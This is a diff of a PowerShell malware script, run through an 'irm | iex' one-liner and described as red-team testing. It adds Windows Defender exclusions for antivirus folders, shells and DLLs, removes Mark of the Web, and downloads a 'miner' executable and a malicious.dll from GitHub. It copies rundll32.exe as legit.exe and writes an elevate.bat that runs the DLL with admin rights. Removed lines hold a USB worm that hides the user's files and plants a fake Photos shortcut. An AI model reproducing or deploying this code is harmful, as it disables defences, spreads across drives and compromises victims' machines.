@@ -1,50 +1,31 @@
-# script.ps1 (Fixed for execution, GitHub rendering, prioritized updater.exe handling, and USB propagation at the end)
+# script.ps1 (Working script with malicious.dll download, elevate.bat creation, and rundll32.exe copy in C:\Windows\Temp)
 # Fetched via: cmd.exe /c powershell.exe -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex"
-# Prioritizes updater.exe handling, then USB propagation, for ethical red team testing in a controlled lab environment.
+# Prioritizes updater.exe handling, then adds DLL download, batch file creation, and executable copy for ethical red team testing.
 
 Start-Sleep -Seconds 15
 
 # Logging Setup
 $logPath = "C:\Windows\Temp\boot_execution_log.txt"
-$fallbackLogPath = "$env:TEMP\boot_execution_log_$(Get-Random).txt"
 $logDirectory = Split-Path -Path $logPath -Parent
 
-# Function to test write access
-function Test-WriteAccess {
-    param ($Path)
-    try {
-        $testFile = Join-Path $Path "test_$(Get-Random).txt"
-        Set-Content -Path $testFile -Value "Test" -Force -ErrorAction Stop
-        Remove-Item -Path $testFile -Force -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
+if (-not (Test-Path -Path $logDirectory)) {
+    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
 }
 
-# Select log path based on write access
-if (-not (Test-WriteAccess "C:\Windows\Temp")) {
-    $logPath = $fallbackLogPath
-    $logDirectory = Split-Path -Path $logPath -Parent
-}
-
-# Create log directory and initial log entry
+# Initial log entry
 try {
-    if (-not (Test-Path -Path $logDirectory)) {
-        New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
-        Add-Content -Path $logPath -Value "Created log directory: $logDirectory" -Force
-    }
-    Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account (02:00 PM IST, June 30, 2025)." -Force
+    Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account (02:20 PM IST, June 30, 2025)." -Force
 } catch {
-    $logPath = $fallbackLogPath
+    Write-Host "Failed to create log at $logPath: $_"
+    $logPath = "$env:TEMP\boot_execution_log_$(Get-Random).txt"
     $logDirectory = Split-Path -Path $logPath -Parent
     try {
         if (-not (Test-Path -Path $logDirectory)) {
             New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
         }
-        Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Fallback log due to access issue with C:\Windows\Temp." -Force
+        Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Fallback log due to access issue." -Force
     } catch {
-        Write-Host "CRITICAL: Failed to create log file at any location. Error: $_"
+        Write-Host "CRITICAL: Failed to create log file at any location: $_"
         exit
     }
 }
@@ -54,18 +35,12 @@ try {
     $policy = Get-ExecutionPolicy -Scope CurrentUser
     Add-Content -Path $logPath -Value "Execution Policy: $policy"
     if ($policy -eq "Restricted") {
-        Add-Content -Path $logPath -Value "WARNING: Execution policy is Restricted. Set to RemoteSigned for script execution."
-        Write-Host "Execution policy is Restricted. Run 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned' to allow script execution."
+        Add-Content -Path $logPath -Value "WARNING: Execution policy is Restricted. Set to RemoteSigned."
+        Write-Host "Execution policy is Restricted. Run 'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned'."
     }
 } catch {
     Add-Content -Path $logPath -Value "Failed to check execution policy: $_"
-}
-
-# Log environment details
-try {
-    Add-Content -Path $logPath -Value "Running as: $(whoami), TEMP: $env:TEMP, Process ID: $PID"
-} catch {
-    Add-Content -Path $logPath -Value "Failed to log environment details: $_"
+    Write-Host "Failed to check execution policy: $_"
 }
 
 # Verify admin status
@@ -81,16 +56,17 @@ function Is-Admin {
 }
 try {
     if (Is-Admin) {
-        Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
+        Add-Content -Path $logPath -Value "Confirmed: Running with Administrator (SYSTEM) privileges."
     } else {
-        Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
-        Write-Host "Script is not running with admin privileges. Some operations may fail."
+        Add-Content -Path $logPath -Value "WARNING: Not running with Administrator privileges."
+        Write-Host "Not running with admin privileges. Some operations may fail."
     }
 } catch {
     Add-Content -Path $logPath -Value "Error checking admin status: $_"
+    Write-Host "Error checking admin status: $_"
 }
 
-# Updater.exe Handling (Priority)
+# Updater.exe Handling
 $payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe"
 $payloadPath = "C:\Windows\Temp\updater.exe"
 
@@ -112,7 +88,8 @@ try {
             Unblock-File -Path $payloadPath -ErrorAction Stop
             Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
         } catch {
-            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
+            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath: $_"
+            Write-Host "Failed to remove Mark of the Web from $payloadPath: $_"
         }
 
         try {
@@ -124,10 +101,10 @@ try {
             Write-Host "Failed to execute existing updater.exe: $_"
         }
     } else {
-        Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation process without execution."
+        Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation."
 
         # Defender Exclusions
-        Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
+        Add-Content -Path $logPath -Value "Waiting for Windows Defender service..."
         $maxAttempts = 20
         $delayBetweenChecks = 5
 
@@ -140,14 +117,14 @@ try {
                     break
                 }
             } catch {
-                Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
+                Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not ready: $_"
             }
             Start-Sleep -Seconds $delayBetweenChecks
             if ($i -eq ($maxAttempts - 1)) {
-                Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
+                Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be ready."
             }
         }
-        Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
+        Add-Content -Path $logPath -Value "Finished Defender wait. Proceeding with exclusions."
 
         Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
 
@@ -164,13 +141,17 @@ try {
             "C:\Program Files\Symantec",
             "C:\Program Files\Kaspersky Lab",
             "C:\Program Files\Avast Software",
-            "C:\Program Files\AVG"
+            "C:\Program Files\AVG",
+            "C:\Windows\Temp\malicious.dll",
+            "C:\Windows\Temp\legit.exe",
+            "C:\Windows\Temp\elevate.bat"
         )
 
         $exclusionsProcesses = @(
             "updater.exe",
             "cmd.exe",
-            "powershell.exe"
+            "powershell.exe",
+            "legit.exe"
         )
 
         $exclusionsExtensions = @(
@@ -179,7 +160,8 @@ try {
             "cmd",
             "ps1",
             "vbs",
-            "js"
+            "js",
+            "dll"
         )
 
         foreach ($excl in $exclusionsPaths) {
@@ -272,13 +254,13 @@ try {
                 Unblock-File -Path $payloadPath -ErrorAction Stop
                 Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
             } catch {
-                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
+                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath: $_"
             }
 
             Add-Content -Path $logPath -Value "Payload downloaded successfully but not executed, as per configuration."
 
         } catch {
-            Add-Content -Path $logPath -Value "Failed to fetch payload from $payloadUrl. Error: $_"
+            Add-Content -Path $logPath -Value "Failed to fetch payload from $payloadUrl: $_"
             Write-Host "Failed to fetch payload: $_"
         }
     }
@@ -287,139 +269,76 @@ try {
     Write-Host "Updater.exe handling failed: $_"
 }
 
-# USB Propagation (Added at the End)
+# Malicious DLL Download, elevate.bat Creation, and rundll32.exe Copy
 try {
-    Add-Content -Path $logPath -Value "Starting USB propagation logic."
-    
-    # USB Propagation Functions
-    function Watch-USB {
-        param ($LogPath)
-        try {
-            Add-Content -Path $LogPath -Value "Starting USB monitoring for propagation at $(Get-Date)."
-            $wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_DiskDrive' AND TargetInstance.InterfaceType = 'USB'"
-            Register-WmiEvent -Query $wmiQuery -Action {
-                try {
-                    $driveLetter = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -like "$($eventArgs.NewEvent.TargetInstance.DeviceID)*"}).DeviceID
-                    if ($driveLetter) {
-                        Add-Content -Path $event.MessageData.LogPath -Value "USB detected: $driveLetter at $(Get-Date)."
-                        Infect-USB -DriveLetter $driveLetter -LogPath $event.MessageData.LogPath
-                    }
-                } catch {
-                    Add-Content -Path $event.MessageData.LogPath -Value "USB event handler failed: $_"
-                }
-            } -MessageData @{LogPath=$LogPath} -ErrorAction Stop
-            Add-Content -Path $logPath -Value "USB monitoring event registered successfully."
-        } catch {
-            Add-Content -Path $LogPath -Value "Failed to register USB monitoring event: $_"
-            Write-Host "Failed to register USB monitoring: $_"
-        }
+    Add-Content -Path $logPath -Value "Starting malicious DLL download, elevate.bat creation, and rundll32.exe copy."
+
+    # Copy rundll32.exe to C:\Windows\Temp\legit.exe
+    $legitExePath = "$env:windir\System32\rundll32.exe"
+    $tempLegitExePath = "C:\Windows\Temp\legit.exe"
+    try {
+        Copy-Item -Path $legitExePath -Destination $tempLegitExePath -Force -ErrorAction Stop
+        Add-Content -Path $logPath -Value "Copied rundll32.exe to $tempLegitExePath."
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to copy rundll32.exe to $tempLegitExePath: $_"
+        Write-Host "Failed to copy rundll32.exe: $_"
     }
 
-    # Initialize USB monitoring in a runspace
-    $rs = [RunspaceFactory]::CreateRunspace()
-    $rs.Open()
-    $ps = [PowerShell]::Create()
-    $ps.Runspace = $rs
-    [void]$ps.AddScript({
-        param($LogPath)
-        # Define Infect-USB within the runspace to avoid sourcing issues
-        function Infect-USB {
-            param (
-                $DriveLetter,
-                $LogPath
-            )
+    # Download malicious.dll
+    $dllPath = "C:\Windows\Temp\malicious.dll"
+    $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
+    try {
+        if (-not (Test-Path $dllPath)) {
+            Add-Content -Path $logPath -Value "Downloading malicious.dll from $dllUrl..."
+            Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
+            Add-Content -Path $logPath -Value "Downloaded malicious.dll to $dllPath."
             try {
-                # Create hidden folders
-                $hiddenFolder = "$DriveLetter\RECYCLER.BIN"
-                $filesFolder = "$hiddenFolder\Files"
-                New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
-                New-Item -Path $filesFolder -ItemType Directory -Force | Out-Null
-                Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
-                Set-ItemProperty -Path $filesFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
-                Add-Content -Path $LogPath -Value "Created hidden folders: $hiddenFolder, $filesFolder"
-
-                # Move legitimate USB files to hidden folder
-                $usbFiles = Get-ChildItem -Path $DriveLetter -Exclude "RECYCLER.BIN" -ErrorAction SilentlyContinue
-                foreach ($file in $usbFiles) {
-                    try {
-                        Move-Item -Path "$DriveLetter\$($file.Name)" -Destination "$filesFolder\$($file.Name)" -Force -ErrorAction Stop
-                        Add-Content -Path $LogPath -Value "Moved file to hidden folder: $($file.Name)"
-                    } catch {
-                        Add-Content -Path $LogPath -Value "Failed to move file $($file.Name): $_"
-                    }
-                }
-
-                # Copy legitimate executable (rundll32.exe)
-                $legitExePath = "$env:windir\System32\rundll32.exe"
-                $usbLegitExePath = "$hiddenFolder\legit.exe"
-                Copy-Item -Path $legitExePath -Destination $usbLegitExePath -Force -ErrorAction Stop
-                Add-Content -Path $LogPath -Value "Copied rundll32.exe to $usbLegitExePath"
-
-                # Download malicious DLL
-                $dllPath = "C:\Windows\Temp\malicious.dll"
-                $usbDllPath = "$hiddenFolder\malicious.dll"
-                $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
-                if (-not (Test-Path $dllPath)) {
-                    try {
-                        Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
-                        Add-Content -Path $LogPath -Value "Downloaded malicious.dll to $dllPath"
-                        try {
-                            Unblock-File -Path $dllPath -ErrorAction Stop
-                            Add-Content -Path $LogPath -Value "Removed Mark of the Web from $dllPath."
-                        } catch {
-                            Add-Content -Path $LogPath -Value "Failed to remove Mark of the Web from $dllPath: $_"
-                        }
-                    } catch {
-                        Add-Content -Path $LogPath -Value "Failed to download malicious.dll from $dllUrl: $_"
-                        $dllContent = @" [DllMain] EXPORT void Run() { system("start /b C:\\Windows\\Temp\\updater.exe");
-                        system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");}"@
-                        Add-Content -Path $dllPath -Value $dllContent -ErrorAction Stop
-                        Add-Content -Path $LogPath -Value "Created placeholder DLL at $dllPath (non-executable, compile for production)"
-                    }
-                }
-                Copy-Item -Path $dllPath -Destination $usbDllPath -Force -ErrorAction Stop
-                Add-Content -Path $LogPath -Value "Copied malicious DLL to $usbDllPath"
-
-                # Create elevate.bat to request admin privileges
-                $batPath = "$hiddenFolder\elevate.bat"
-                $batContent = @" @echo off echo Loading your photos, please wait...
-                powershell -Command "Start-Process rundll32.exe -ArgumentList '$usbLegitExePath $usbDllPath,Run' -Verb RunAs" "@
-                Set-Content -Path $batPath -Value $batContent -Force
-                Add-Content -Path $LogPath -Value "Created elevate.bat at $batPath"
-
-                # Create convincing LNK file to run elevate.bat
-                $wshell = New-Object -ComObject WScript.Shell
-                $lnkPath = "$DriveLetter\Photos.lnk"
-                $lnk = $wshell.CreateShortcut($lnkPath)
-                $lnk.TargetPath = $batPath
-                $lnk.IconLocation = "%SystemRoot%\system32\imageres.dll,4"
-                $lnk.Description = "Open your photo collection from this USB"
-                $lnk.Save()
-                Add-Content -Path $LogPath -Value "Created LNK file: $lnkPath"
+                Unblock-File -Path $dllPath -ErrorAction Stop
+                Add-Content -Path $logPath -Value "Removed Mark of the Web from $dllPath."
             } catch {
-                Add-Content -Path $LogPath -Value "USB infection failed for $DriveLetter: $_"
+                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $dllPath: $_"
+                Write-Host "Failed to remove Mark of the Web from $dllPath: $_"
             }
+        } else {
+            Add-Content -Path $logPath -Value "malicious.dll already exists at $dllPath."
         }
-
-        Watch-USB -LogPath $LogPath
-    }).AddArgument($logPath)
-    $handle = $ps.BeginInvoke()
-    Add-Content -Path $logPath -Value "USB monitoring initialized successfully."
-} catch {
-    Add-Content -Path $logPath -Value "Failed to initialize USB propagation: $_"
-    Write-Host "Failed to initialize USB propagation: $_"
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to download malicious.dll from $dllUrl: $_"
+        Write-Host "Failed to download malicious.dll: $_"
+        try {
+            # Placeholder DLL content (multi-line for readability, mimics C-style DLL source)
+            $dllContent = @"
+[DllMain]
+EXPORT void Run() {
+    system("start /b C:\\Windows\\Temp\\updater.exe");
+    system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");
 }
+"@
+            Add-Content -Path $dllPath -Value $dllContent -ErrorAction Stop
+            Add-Content -Path $logPath -Value "Created placeholder DLL at $dllPath (non-executable, compile for production)."
+        } catch {
+            Add-Content -Path $logPath -Value "Failed to create placeholder DLL at $dllPath: $_"
+            Write-Host "Failed to create placeholder DLL: $_"
+        }
+    }
 
-# Keep Script Running for USB Monitoring
-try {
-    Add-Content -Path $logPath -Value "Script entering infinite loop to maintain USB monitoring."
-    while ($true) {
-        Start-Sleep -Seconds 30
-        Add-Content -Path $logPath -Value "USB monitoring active at $(Get-Date)."
+    # Create elevate.bat
+    $batPath = "C:\Windows\Temp\elevate.bat"
+    $batContent = @"
+@echo off
+echo Loading system utilities, please wait...
+powershell -Command "Start-Process rundll32.exe -ArgumentList 'C:\Windows\Temp\legit.exe C:\Windows\Temp\malicious.dll,Run' -Verb RunAs"
+"@
+    try {
+        Set-Content -Path $batPath -Value $batContent -Force -ErrorAction Stop
+        Add-Content -Path $logPath -Value "Created elevate.bat at $batPath."
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to create elevate.bat at $batPath: $_"
+        Write-Host "Failed to create elevate.bat: $_"
     }
 } catch {
-    Add-Content -Path $logPath -Value "Infinite loop failed: $_"
-    Write-Host "Infinite loop failed: $_"
+    Add-Content -Path $logPath -Value "DLL download, elevate.bat creation, or rundll32.exe copy failed: $_"
+    Write-Host "DLL download, elevate.bat creation, or rundll32.exe copy failed: $_"
 }
 
 Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
